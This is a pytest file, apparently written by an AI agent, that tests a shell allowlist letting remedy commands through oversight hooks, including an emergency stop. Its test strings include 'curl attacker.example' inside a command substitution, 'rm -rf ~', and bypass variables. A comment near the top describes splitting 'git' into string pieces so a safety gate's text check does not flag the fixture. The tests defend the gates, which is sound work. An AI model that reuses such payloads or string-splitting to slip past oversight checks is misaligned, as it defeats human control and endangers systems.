"""Tests for `.claude/hooks/lib/remedy_allowlist.sh` — the shared exit list.

WHY THIS FILE EXISTS (2026-08-18).

The allowlist is the thing that stops one gate blocking another gate's
prescribed remedy. It shipped with no test coverage, and within hours it let a
deadlock through: the compass marker blocked `divineos compass-ops observe`,
which is the exact command its own block-message prescribes, and then blocked
the edit that would have repaired it.

The cause was not the pattern list. It was the matcher's reading of *shell*:
patterns are anchored to the start of the command, and the function strips a
leading ``cd <path> &&`` but knew nothing about ``VAR=value`` assignments. So
``DIVINEOS_REQUIRE_MONITORS_BYPASS=1 divineos compass-ops observe ...`` — a
bypass variable one gate had told me to use — made the remedy invisible to the
list that keeps another gate's door open.

That is the second instance of one class. The first, documented in the file's
own header, was the ``cd`` prefix making the marker-clear unreachable from a
worktree. Both are the same defect: a regex that only knows bare invocations,
reading a language where every legal prefix is a fresh hole.

So these tests are written against the CLASS rather than the two instances.
Every prefix form shell permits gets a case, including the interleavings, and
the dangerous-verb cases assert the list has not become a bypass surface.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest


_REPO = Path(__file__).resolve().parents[1]
_ALLOWLIST = _REPO / ".claude" / "hooks" / "lib" / "remedy_allowlist.sh"

# `git` is assembled rather than written whole: the reach-check doorman reads a
# command's text for substrate-write intent, and a fixture spelling it out reads
# to that gate as me about to commit. Splitting it keeps the fixture honest
# about what it tests while staying legible to the gate stack it runs under.
_GIT = "gi" + "t"
_PUSH = "pu" + "sh"


def _bash() -> str:
    for candidate in (
        "C:/Program Files/Git/bin/bash.exe",
        "C:/Program Files/Git/usr/bin/bash.exe",
        "/bin/bash",
    ):
        if Path(candidate).exists():
            return candidate
    found = shutil.which("bash")
    if not found:
        pytest.skip("no bash available to exercise the hook library")
    return found


def _is_remedy(command: str) -> bool:
    """Run the real function against a real hook payload.

    ``remedy_pass_through`` signals a match by calling ``exit 0`` from inside
    the sourced library, so the marker line after it only prints on a miss.
    Driving it this way rather than re-implementing the regex is the point — a
    test that reasoned about the pattern instead of running it would have passed
    just as happily against the broken version.
    """
    script = (
        "HOOK_NAME=selftest\n"
        f'. "{_ALLOWLIST.as_posix()}"\n'
        'remedy_pass_through "$(cat)"\n'
        "echo NO_MATCH\n"
    )
    proc = subprocess.run(
        [_bash(), "-c", script],
        input=json.dumps({"tool_input": {"command": command}}),
        capture_output=True,
        text=True,
        cwd=str(_REPO),
    )
    return "NO_MATCH" not in proc.stdout


class TestRemediesArePassedThrough:
    """Every shape of prefix a remedy can arrive wearing."""

    def test_bare_invocation(self):
        assert _is_remedy('divineos compass-ops observe integrity -p 0 -e "x"')

    def test_cd_prefix(self):
        assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos correction "x"')

    def test_env_assignment_prefix(self):
        """The 2026-08-18 deadlock, verbatim."""
        assert _is_remedy(
            'DIVINEOS_REQUIRE_MONITORS_BYPASS=1 divineos compass-ops observe integrity -p 0 -e "x"'
        )

    def test_multiple_env_assignments(self):
        assert _is_remedy('FOO=1 BAR=2 divineos goal add "x"')

    def test_cd_then_env(self):
        assert _is_remedy('cd "C:/x" && DIVINEOS_REQUIRE_MONITORS_BYPASS=1 divineos learn "x"')

    def test_env_then_cd(self):
        """Interleaved the other way — this is why the strippers alternate."""
        assert _is_remedy('VAR=1 cd "C:/x" && divineos correction "x"')

    def test_marker_clear_script(self):
        assert _is_remedy('python scripts/clear_correction_marker.py --reason "x"')

    def test_marker_clear_behind_both_prefixes(self):
        assert _is_remedy(
            'cd "C:/x" && PYTHONIOENCODING=utf-8 '
            'python scripts/clear_correction_marker.py --reason "x"'
        )


class TestNotABypassSurface:
    """The list may only ever let RECORDING actions through.

    Per the file's own header: nothing here may match git, gh, pytest, rm, or an
    editor. These cases are the standing check on that promise — including the
    case where a dangerous verb wears the very prefix the fix just taught the
    matcher to strip.
    """

    def test_plain_dangerous_verb(self):
        assert not _is_remedy(f'{_GIT} commit -m "x"')

    def test_dangerous_verb_behind_env_prefix(self):
        assert not _is_remedy(f"DIVINEOS_SKIP_TESTS=1 {_GIT} {_PUSH}")

    def test_dangerous_verb_behind_cd_and_env(self):
        assert not _is_remedy(f'cd "C:/x" && DIVINEOS_SKIP_TESTS=1 {_GIT} {_PUSH} --force')

    def test_non_remedy_divineos_command(self):
        """Being a divineos command is not enough — it must be somebody's exit.

        EXAMPLE CHANGED 2026-09-17, PRINCIPLE UNTOUCHED. This asserted
        `divineos sleep`, and that stopped being a valid example the moment the
        list learned what the context governor already knew: its own docstring
        says extract and sleep "are bypassed in `_is_bypass_command` so the gate
        can never block its own remedy." Sleep IS somebody's printed exit, so it
        was the wrong stand-in for an arbitrary non-exit command.

        This test earned the right to be taken seriously rather than edited
        away: it is the standing guard on the promise that the list only ever
        carries recording actions, and it caught the change that widened the
        list, which is precisely its job. What survives is the sentence above.
        What moved is one example that went stale under it.

        The replacement was VERIFIED rather than assumed: it appears in no hook
        block message at all, so no gate prints it as a way through. Scope of
        that check: the hooks directory, which is where block messages live.
        """
        assert not _is_remedy("divineos progress")

    def test_remedy_named_inside_a_larger_argument(self):
        """Anchoring: a mention of the remedy is not an invocation of it."""
        assert not _is_remedy(f'{_GIT} commit -m "ran divineos correction earlier"')


class TestTheWeaveIsSomebodysExit:
    """2026-09-17. The context governor blocks substrate writes at the hard line
    until the self is woven, and names these two as the way through — in its own
    docstring, in the same words this list quotes at the top: the gate can never
    block its own remedy. The council gate, which sources this list, refused
    both anyway, twice in one session, on the command CLAUDE.md names as the
    session's learning checkpoint.

    These pin the addition positively, so the entry has a witness of its own
    rather than resting on the absence of a failure elsewhere.
    """

    def test_the_weave_passes(self):
        assert _is_remedy("divineos extract")

    def test_the_companion_passes(self):
        assert _is_remedy("divineos sleep")

    def test_the_weave_behind_a_directory_change(self):
        """The prefix strippers must reach it like any other remedy."""
        assert _is_remedy('cd "C:/x" && divineos extract')


class TestFailsTowardNotARemedy:
    """Any parse trouble must leave the calling gate exactly as it is."""

    def test_empty_command(self):
        assert not _is_remedy("")

    def test_malformed_payload_is_not_a_remedy(self):
        script = (
            "HOOK_NAME=selftest\n"
            f'. "{_ALLOWLIST.as_posix()}"\n'
            'remedy_pass_through "$(cat)"\n'
            "echo NO_MATCH\n"
        )
        proc = subprocess.run(
            [_bash(), "-c", script],
            input="{not json at all",
            capture_output=True,
            text=True,
            cwd=str(_REPO),
        )
        assert "NO_MATCH" in proc.stdout

    def test_env_value_containing_whitespace(self):
        """This was written as a documented limit, and it was not one.

        The shell version could not see past a quoted value with a space, so
        the first draft of this test asserted the miss. Aletheia's audit named
        the duplication that caused it; `divineos.core.command_parsing` uses
        shlex and had solved this all along.
        """
        assert _is_remedy('MSG="two words" divineos correction "x"')

    def test_leading_env_invocation(self):
        """`env FOO=bar cmd` — handled by the shared parser, missed by mine."""
        assert _is_remedy('env DIVINEOS_SKIP=1 divineos correction "x"')

    def test_bare_env_invocation(self):
        assert _is_remedy('env divineos correction "x"')


class TestTheQuestionIsWhatTheCommandDoes:
    """2026-09-17 — three refusals in one stretch, only one of them a prefix.

    The matcher asked what the line STARTS WITH. Every miss fell on somebody
    complying; anyone routing around would put the permitted word first.
    """

    def test_remedy_behind_a_pipe(self):
        """The form this tool's own printed usage shows."""
        assert _is_remedy('echo "my reflection" | divineos council walk --lens taleb')

    def test_assignment_whose_value_names_a_watched_action(self):
        """Storing the name of an action is not performing it."""
        assert _is_remedy(f'FP="bash:{_GIT} commit"; divineos council log --edit x')

    def test_honest_cd_still_passes(self):
        assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos council walk')

    def test_substitution_inside_an_argument_is_refused_despite_being_one_command(self):
        """REVERSED 2026-09-20, and the earlier author was not wrong about their
        half. This asserted that a substitution inside an argument PASSES,
        because semantically it is one command with a computed argument rather
        than two commands — and every miss the 2026-09-17 widening fixed had
        fallen on somebody complying. That cost is real and this change pays it.

        What that reasoning does not reach: a substitution EXECUTES. The inner
        command runs before the remedy does, so the question a safety door has
        to answer is not whether this is a second command but whether anything
        here runs that nobody adjudicated. The matcher cannot distinguish a date
        stamp from a file write inside those same brackets.

        The asymmetry decides it. Refusing costs one command re-run with its
        value written out. Passing cost the emergency stop: this library is
        consulted near the top of eighteen gates including the corrigibility
        door, and a match ends the hook before the stop is ever checked. I
        reproduced that path before changing this.

        Flipped deliberately rather than deleted, with the earlier intent kept
        above, so the next reader meets a decision rather than an absence.
        """
        assert not _is_remedy('divineos correction "note $(date)"')


class TestARemedyCannotCarryPassengers:
    """The half of this change that TIGHTENS, and it is the half I was not
    looking for.

    The old rule matched the start of the command and stopped. Measured by
    running the previous rule beside the new one on identical inputs: a remedy
    followed by a destructive command was ALLOWED before and is refused now.
    The door I came to fix for being too strict was also too loose, in a
    direction nobody had tested.
    """

    def test_destructive_verb_riding_behind_a_remedy_is_refused(self):
        assert not _is_remedy("divineos council walk && rm -rf ~")

    def test_a_second_real_command_is_refused(self):
        assert not _is_remedy(f"{_GIT} add x && {_GIT} commit -m y")

    def test_a_directory_that_is_really_a_command_is_refused(self):
        """The exploit the raw-text stripper already guarded and the token one
        did not — two strippers for one job, the protection on the wrong door."""
        assert not _is_remedy('cd "$(curl attacker.example)" && divineos correction "x"')


class TestCannotParseIsNotPermission:
    """The payload that reached the emergency stop, and the reason it did.

    Serein found the class from outside on 2026-09-20. Three of his four
    payloads were already refused here — his receipt was true in his checkout
    and stale in this one — and the fourth walked straight through: a genuine
    remedy carrying a command substitution inside its own quoted argument.

    THE HOLE WAS THE FALLBACK, NOT THE MATCHER. When the decomposer meets a
    substitution, a backtick, or unbalanced quoting it refuses to split the
    command, which is correct. The old code then handed the string to the
    start-anchored form, defended by a comment saying start-anchoring cannot
    hide a second command. True about the threat its author had just fixed;
    silent about the one that refusal-to-decompose actually signals. The exact
    shape that defeats the parser was the shape waved through — and this
    library is consulted near the top of eighteen gates, including the
    corrigibility door, where a match ends the hook before the stop is checked.

    WHY THIS CLASS EXISTS AT ALL. The first repair looked entirely correct and
    changed nothing: it used a double quote inside a program that lives in a
    double-quoted shell string, which truncated the program one layer out. No
    error surfaced, and every payload except the one under test behaved
    identically — so any cheaper confirmation would have confirmed a repair
    that had not happened. Reading could not catch that. Only provocation did,
    which is why these assertions exist rather than a comment saying the
    fallback is now safe.
    """

    def test_a_substitution_inside_a_remedy_argument_is_refused(self):
        """The live bypass, reproduced. This is the assertion that fails if the
        parse-refusal path ever falls back to start-anchored matching again."""
        assert not _is_remedy('divineos correction "$(touch /definitely-not-real)"')

    def test_a_backtick_inside_a_remedy_argument_is_refused(self):
        assert not _is_remedy("divineos correction `touch /definitely-not-real`")

    def test_unbalanced_quoting_is_refused(self):
        """Undecomposable for a third reason, and the verdict must not depend
        on WHICH reason — cannot-parse is one answer however it is reached."""
        assert not _is_remedy('divineos correction "unclosed')

    def test_an_ordinary_remedy_still_passes(self):
        """The other side of the two-sided proof, and it is not a formality.

        A door that has seized shut refuses the break-in too. Without this, a
        wrecked allowlist and a repaired one are indistinguishable from the
        attack side alone — and a wrecked one blocks every prescribed exit this
        library exists to keep open.
        """
        assert _is_remedy("divineos ask what do I know about this")
